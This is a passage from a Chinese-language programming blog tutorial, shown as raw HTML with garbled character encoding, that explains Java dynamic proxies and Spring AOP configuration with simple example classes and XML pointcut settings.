prototypeï¼Œè€Œåœ¨ javaconfig ä¸­çš„<code>@Bean</code>æ³¨è§£ä½œç”¨çš„ç±»ï¼Œå®ƒçš„ä½œç”¨åŸŸé»˜è®¤æ˜¯ singletonï¼Œä¹Ÿå°±æ˜¯å…¨å±€å•ä¸€</p><h2 id="7-é™æ€ä»£ç†å’ŒåŠ¨æ€ä»£ç†"><a href="#7-é™æ€ä»£ç†å’ŒåŠ¨æ€ä»£ç†" class="headerlink" title="7 é™æ€ä»£ç†å’ŒåŠ¨æ€ä»£ç†"></a>7 é™æ€ä»£ç†å’ŒåŠ¨æ€ä»£ç†</h2><p>è¿™é‡Œçš„åŠ¨æ€ä»£ç†å†…å®¹å¸ˆå‚…ä»¬å¦‚æœä¸ä»‹æ„å¯ä»¥çœ‹æˆ‘è¿™ç¯‡æ–‡ç«  <a href="https://www.yuque.com/5tooc3a/jas/ssz3gd93odxikn0g?singleDoc#">https://www.yuque.com/5tooc3a/jas/ssz3gd93odxikn0g?singleDoc</a></p><p>è¿™é‡Œæˆ‘å†è‡ªå·±æ€»ç»“è®°å½•å†™ä¸€ä¸‹ï¼š</p><p>ä¸è®ºæ˜¯é™æ€ä»£ç†è¿˜æ˜¯åŠ¨æ€ä»£ç†ï¼Œä»–ä»¬éƒ½æ˜¯ä¸€ç§è®¾è®¡æ¨¡å¼ï¼Œé‡ç‚¹æ˜¯å…¶æ€æƒ³ï¼šåœ¨ä¸æ”¹å˜åŸæœ‰åŠŸèƒ½çš„ä»£ç å‰æä¸‹ï¼Œæˆ‘ä»¬å°†æ¯ä¸ªåŠŸèƒ½ç‚¹ä¸­çš„å…±åŒéƒ¨åˆ†â€“<strong>æ¯”è¯´æ—¥æœŸå†™è¿›æ—¥å¿—ï¼Œä¸å¯¹åº”çš„ç«¯å£å»ºç«‹ TCP è¿æ¥ç­‰æ“ä½œ</strong>ç»™æŠ½ç¦»å‡ºæ¥ï¼Œè£…è¿›ä»£ç†ç±»ï¼Œæ¯å½“æˆ‘ä»¬è°ƒç”¨åŠŸèƒ½ç±»ä¸­çš„è¿™äº›æ–¹æ³•æ—¶ï¼Œä»£ç†ç±»èƒ½å¤Ÿåœ¨æ°å½“çš„æ—¶é—´ç‚¹å»æ‰§è¡Œè¿™äº›éƒ¨åˆ†</p><h3 id="0x0S-åŠ¨æ€ä»£ç†"><a href="#0x0S-åŠ¨æ€ä»£ç†" class="headerlink" title="0x0S åŠ¨æ€ä»£ç†"></a>0x0S åŠ¨æ€ä»£ç†</h3><p>ï¼ˆå› ä¸ºæŸäº›æ·±åˆ»çš„æ•™è¯²å’Œå›å¿†ï¼‰ ç»†å†™å’Œæ„Ÿå—ä¸€ä¸‹åŠ¨æ€ä»£ç†</p><p> é™æ€ä»£ç†ï¼ŒåŠ¨æ€ä»£ç†ï¼Œä»–ä»¬çš„æœåŠ¡è§’è‰²éƒ½æ˜¯ä¸€æ ·çš„ï¼š</p><ol><li>æŠ½è±¡å¯¹è±¡</li><li>çœŸå®å¯¹è±¡</li></ol><p>åŠ¨æ€ä»£ç†çš„ç±»ä¸æ˜¯æˆ‘ä»¬é™æ€å†™å¥½çš„ï¼Œä»–æ˜¯åŠ¨æ€ç”Ÿæˆçš„ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆä¼šæœ‰é™æ€ä»£ç†å’ŒåŠ¨æ€ä»£ç†çš„åŒºåˆ†</p><p>åŠ¨æ€ä»£ç†åˆ†ä¸ºä¸¤å¤§ç±»ï¼š<strong>åŸºäºæ¥å£çš„åŠ¨æ€ä»£ç†  åŸºäºç±»çš„åŠ¨æ€ä»£ç†</strong></p><p>ç°åœ¨æ¥å°è¯•ä¸€ä¸ªå®éªŒ</p><p>æ€»æ¥å£</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.stoocea.demo1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Rent</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">rent</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŸä¸€åŠŸèƒ½å®ç°ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Host</span> <span class="keyword">implements</span> <span class="title class_">Rent</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rent</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æ­£åœ¨testã€‚ã€‚ã€‚ã€‚&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>invocationHandler</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    Rent rent;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TestInvocationHandler</span><span class="params">(Rent rent)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.rent = rent;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TestInvocationHandler</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Object result=method.invoke(rent,args);</span><br><span class="line">        System.out.println(<span class="string">&quot;æ­£åœ¨ç»ç”±åŠ¨æ€ä»£ç†å®ç°è¿‡ç¨‹&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åæ˜¯æµ‹è¯•ç±»ï¼Œä¹Ÿå°±æ˜¯å®¢æˆ·ç«¯è°ƒç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.stoocea.demo1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Rent host=<span class="keyword">new</span> <span class="title class_">Host</span>();</span><br><span class="line">        InvocationHandler hostInvocationHandler=<span class="keyword">new</span> <span class="title class_">TestInvocationHandler</span>(host);</span><br><span class="line">        Rent host1=(Rent) Proxy.newProxyInstance(host.getClass().getClassLoader(),host.getClass().getInterfaces(),hostInvocationHandler);</span><br><span class="line">        host1.rent();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709126456266-7f4ebcb8-831d-4273-a581-368a00b80ad9.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709126456266-7f4ebcb8-831d-4273-a581-368a00b80ad9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æœ€ç»ˆæˆ‘ä»¬è¿”å›çš„åŠŸèƒ½ç±»æ˜¯<code>Proxy</code>è°ƒå–é™æ€æ–¹æ³• <code>newProxyInstance</code>è·å–åˆ°çš„ï¼Œä¹‹å‰å†™çš„åŠŸèƒ½ç±» Hostï¼ˆä¹Ÿå°±æ˜¯æˆ¿ä¸œé›‡ä¸»ï¼‰è°ƒç”¨å®ƒçš„æ–¹æ³•æ—¶ï¼Œä¼šè‡ªåŠ¨ç¼–ç è·³è½¬åˆ°<code>hostInvocationHandler</code>çš„ invoke ä¸­è¿›è¡Œé€»è¾‘å¤„ç†ï¼Œè‡ªå·±çš„é€»è¾‘å°±ä¸ä¼šèµ°äº†ï¼ŒåŠ¨æ€ä»£ç†çš„å®ç°éƒ½æ˜¯é€šè¿‡åå°„å®ç°çš„ï¼Œä¸è®ºæ˜¯è°ƒç”¨é›‡ä¸»çš„åŸæ–¹æ³•ï¼Œè¿˜æ˜¯åˆ›å»ºä»£ç†ç±»ï¼Œéƒ½æ˜¯é€šè¿‡åå°„</p><p>ç†è§£å®Œä»£ç†æ¨¡å¼ï¼Œæˆ‘ä»¬è¿›å…¥ AOP çš„å­¦ä¹ </p><h2 id="8-AOPï¼ˆé¢å‘åˆ‡é¢ç¼–ç¨‹ï¼‰"><a href="#8-AOPï¼ˆé¢å‘åˆ‡é¢ç¼–ç¨‹ï¼‰" class="headerlink" title="8 AOPï¼ˆé¢å‘åˆ‡é¢ç¼–ç¨‹ï¼‰"></a>8 AOPï¼ˆé¢å‘åˆ‡é¢ç¼–ç¨‹ï¼‰</h2><p>å…ˆçœ‹å…¨è‹±æ–‡ Aspect Oriented Programmingï¼Œå°±æ˜¯ç›´è¯‘è¿‡æ¥çš„ï¼Œå®ƒåŸç†æ˜¯é€šè¿‡é¢„ç¼–è¯‘ï¼Œæˆ–è€…è¿è¡ŒåŠ¨æ€ä»£ç†å®ç°ç¨‹åºåŠŸèƒ½çš„<strong>ç»Ÿä¸€å’Œç»´æŠ¤ï¼Œ</strong>è¿™é‡Œçš„ç»Ÿä¸€å’Œç»´æŠ¤å°±æ˜¯æˆ‘ä»¬åŠ¨æ€ä»£ç†æ‰€è®²çš„åŠŸèƒ½é‡å¤ç‚¹ï¼Œæˆ‘ä»¬æŠŠå®ƒæŠ½ç¦»å‡ºæ¥ã€‚æˆ–è€…æ˜¯ä¸€ä¸ªæ–°åŠŸèƒ½ï¼Œæˆ‘ä»¬éœ€è¦åŠ åˆ°æ¯ä¸€ä¸ªåŠŸèƒ½ç”Ÿæˆå‰ï¼Œç”Ÿæˆä¸­ï¼Œç”Ÿæˆåç­‰</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013172711521.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013172711521.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æœ‰äº›å¾ˆç»•çš„æ¦‚å¿µå°±ç›´æ¥è´´å›¾äº†ï¼Œèƒ½ç†è§£å…¶çœŸå®é¢ç›®æ˜¯ä»€ä¹ˆå³å¯</p><h3 id="0x01-é€šè¿‡-Spring-å®ç°-AOP"><a href="#0x01-é€šè¿‡-Spring-å®ç°-AOP" class="headerlink" title="0x01 é€šè¿‡ Spring å®ç° AOP"></a>0x01 é€šè¿‡ Spring å®ç° AOP</h3><p>é¦–å…ˆæ­å»ºç¯å¢ƒï¼Œå®ç°ä¸€ä¸ª JDBC ä¸šåŠ¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.stoocea.Dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">CURD</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">add</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">delete</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">update</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">select</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.stoocea.Dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleImpl</span> <span class="keyword">implements</span> <span class="title class_">CURD</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æ·»åŠ äº†æ•°æ®&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">delete</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;åˆ é™¤äº†æ•°æ®&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">update</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æ›´æ–°äº†æ•°æ®&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">select</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æŸ¥è¯¢æ•°æ®&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç°åœ¨çš„éœ€æ±‚æ˜¯è¦åœ¨æ‰€æœ‰çš„ CURD æ–¹æ³•ä¹‹å‰å’Œæ–¹æ³•æ‰§è¡Œä¹‹åï¼Œåˆ†åˆ«æ‰“å° before after å­—ç¬¦ä¸²ï¼Œä¸”ä¸ä¿®æ”¹åŸå§‹ä»£ç </p><p>é‚£è¿™é‡Œå°±æ˜¯å®šä¹‰ AOP ä¸­çš„å¸¸ç”¨ç±»äº† <code>AfterReturningAdvice``MethodBeforeAdvice</code></p><p>ä¸¤è€…éƒ½æ˜¯æ¥å£ï¼Œä¸”ä»–ä»¬çš„æœ€å¤§çš„çˆ¶ç±»éƒ½æ˜¯ <code>Advice</code>ï¼Œç„¶åä¸‹é¢åˆ†äº†</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013172737976.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013172737976.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å½“ç„¶è¿˜æœ‰æ›´å¤šï¼Œåªä¸è¿‡è¿™ä¸¤è€…æ˜¯ä¸Šé¢å¸¸ç”¨ç±»çš„çˆ¶ç±»</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013172755737.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013172755737.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013172811279.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013172811279.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä¸¤è€…éƒ½åªå®šä¹‰äº†ä¸€ä¸ªæ–¹æ³•ï¼Œå¹¶ä¸”ä»–ä»¬çš„å‚æ•°éƒ½æ˜¯ 3 ä¸ª</p><p>MethodBeforeAdviceï¼š</p><ul><li>Method-ç›®æ ‡æ–¹æ³•</li><li>args-è¯¥æ–¹æ³•çš„å‚æ•°</li><li>target-ç›®æ ‡æ–¹æ³•çš„ç±»</li></ul><p>AfterReturningAdviceï¼š</p><ul><li>returnValueï¼šæ–¹æ³•ä½œç”¨å®Œä¹‹åçš„è¿”å›å€¼</li><li>methodï¼š ç›®æ ‡æ–¹æ³•</li><li>targetï¼šç›®æ ‡æ–¹æ³•çš„ç±»</li></ul><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥å–å‡º</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.stoocea.log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.AfterReturningAdvice;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">After</span> <span class="keyword">implements</span> <span class="title class_">AfterReturningAdvice</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterReturning</span><span class="params">(Object returnValue, Method method, Object[] args, Object target)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;After.....&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">package</span> com.stoocea.log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.MethodBeforeAdvice;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Before</span> <span class="keyword">implements</span> <span class="title class_">MethodBeforeAdvice</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">before</span><span class="params">(Method method, Object[] args, Object target)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Before......&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åé€šè¿‡ Spring å»é…ç½®ä¸€ä¸‹ AOP</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:p</span>=<span class="string">&quot;http://www.springframework.org/schema/p&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:aop</span>=<span class="string">&quot;http://www.springframework.org/schema/aop&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">     http://www.springframework.org/schema/beans/spring-beans-4.1.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">     http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="string"><span class="tag">     http://www.springframework.org/schema/context/spring-context-4.1.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">     http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-4.1.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;after&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.stoocea.log.After&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;before&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.stoocea.log.Before&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;simple&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.stoocea.Dao.SimpleImpl&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--å¼€å§‹é…ç½®AOP--&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--æ‰“ä¸ŠAOPçš„çº¦æŸ--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:config</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">aop:pointcut</span> <span class="attr">id</span>=<span class="string">&quot;pointcut1&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;execution(* com.stoocea.Dao.SimpleImpl.*(..))&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">aop:advisor</span> <span class="attr">advice-ref</span>=<span class="string">&quot;before&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;pointcut1&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">aop:advisor</span> <span class="attr">advice-ref</span>=<span class="string">&quot;after&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;pointcut1&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¦æ³¨æ„æ‰“åˆ‡é¢çš„ä¸‰é¡¹ï¼Œä¸€æ˜¯å¿…é¡»è¦æœ‰åˆ‡å…¥ç‚¹ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬æƒ³è¦åˆ‡å…¥çš„ç±»ï¼Œä»¥åŠæƒ³è¦åˆ‡å…¥çš„æ–¹æ³•</p><p>ç„¶åå°±æ˜¯åˆ‡äº†ä¹‹åè¯¥å¹²å˜›äº†ï¼Œè¿™é‡Œåˆ†ä¸ºäº†ä¸¤ç§æ–¹æ³•ï¼Œä¸€ç§æ˜¯é€šè¿‡ç¯ç»•åˆ‡å…¥ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬æ¼”ç¤ºçš„è¿™ä¸ª</p><p>é€šè¿‡ IOC ç»™å¤„ç†ç±»å®ä¾‹åŒ–åï¼Œé€šè¿‡ <code>advice-ref=&quot;before&quot;</code>  <code>advice-ref=&quot;after&quot;</code>æ¥è‡ªå®šæ˜¯åˆ‡å…¥å‰ï¼Œè¿˜æ˜¯åˆ‡å…¥åè£…é…</p><p>å¦ä¸€ç§æ–¹æ³•å°±æ˜¯é€šè¿‡åˆ‡é¢ï¼ˆå¤§ç™½è¯å°±æ˜¯ä¸€ä¸ªç”¨æ¥å®šä¹‰ before æ–¹æ³•å’Œ after æ–¹æ³•çš„ç±»ï¼‰ï¼Œç„¶ååœ¨åˆ‡é¢å†…å®ç° before æˆ–è€… after</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.stoocea.log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DiyAop</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">before</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;before ï¼Œï¼Œï¼Œï¼Œï¼Œ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">after</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;after.......&quot;</span>);     </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡åˆ‡é¢å»å®ç° AOP æˆ‘è§‰å¾—æ¯”è¾ƒæœ‰ç»“æ„æ„Ÿï¼Œç›¸æ¯”è¾ƒåŸå§‹çš„æ¥è¯´</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">&lt;!--å¼€å§‹é…ç½®AOP--&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!--æ‰“ä¸ŠAOPçš„çº¦æŸ--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">aop:config</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:aspect</span> <span class="attr">ref</span>=<span class="string">&quot;diy&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">aop:pointcut</span> <span class="attr">id</span>=<span class="string">&quot;point&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;execution(* com.stoocea.Dao.SimpleImpl.*(..))&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">aop:before</span> <span class="attr">method</span>=<span class="string">&quot;before&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;point&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">aop:after</span> <span class="attr">method</span>=<span class="string">&quot;after&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;point&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">aop:aspect</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="0x02-é€šè¿‡æ³¨è§£å»å®ç°-AOP"><a href="#0x02-é€šè¿‡æ³¨è§£å»å®ç°-AOP" class="headerlink" title="0x02 é€šè¿‡æ³¨è§£å»å®ç° AOP"></a>0x02 é€šè¿‡æ³¨è§£å»å®ç° 